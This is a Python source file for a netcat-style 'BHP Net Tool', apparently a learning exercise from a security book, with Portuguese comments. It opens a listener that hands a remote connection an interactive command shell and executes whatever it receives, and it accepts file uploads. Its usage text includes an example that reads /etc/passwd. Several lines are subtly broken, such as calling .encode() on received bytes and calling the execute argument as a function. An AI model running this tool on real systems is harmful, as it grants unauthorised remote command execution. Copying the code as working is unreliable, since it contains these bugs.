import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    output = subprocess.check_output(shlex.split(cmd), stderr = subprocess.STDOUT)
    return output.decode()

class NetCat:
    def __init__(self,args,buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)
        
        try:
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.encode()
                    if recv_len < 4096:
                        break
                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode())
        except KeyboardInterrupt:
            print("Interrompido pelo usuario")
            self.socket.close()
            sys.exit()

    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(
                target=self.handle, args=(client_socket,)
            )
            client_thread.start()
    
    def handle(self,client_socket):
        if self.args.execute:
            output = execute(self.args.execute())
            client_socket.send(output.encode())
        
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break

            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
                message = f'Arquivo salvo {self.args.upload}'
                client_socket.send(message.encode())
            
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                        cmd_buffer = b''
                except Exception as e:
                    print(f"Servidor encerrado {e}")
                    self.socket.close()
                    sys.exit()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='BHP Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Exemplo:            
            netcat.py -t 192.168.1.108 -p 5555 -l -c # shell de comando
            netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload do arquivo
            netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\"# executar
            
            echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 #enviar texto para a porta 135 do servidor
            
            netcat.py -t 192.168.1.108 -p 5555 # conectar a porta do servidor
        '''))
    parser.add_argument('-c','--command', action='store_true', help='shell de comando')
    parser.add_argument('-e', '--execute', help='executar comando especificado')
    parser.add_argument('-l', '--listen', action='store_true', help='ouvir')
    parser.add_argument('-p', '--port', type=int, default=5555, help='porta especificado')
    parser.add_argument('-t', '--target', default='192.168.208.3', help='IP especificado')
    parser.add_argument('-u', '--upload', help='fazer upload do arquivo')
    args = parser.parse_args()
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()
    
    nc = NetCat(args, buffer.encode())
    nc.run()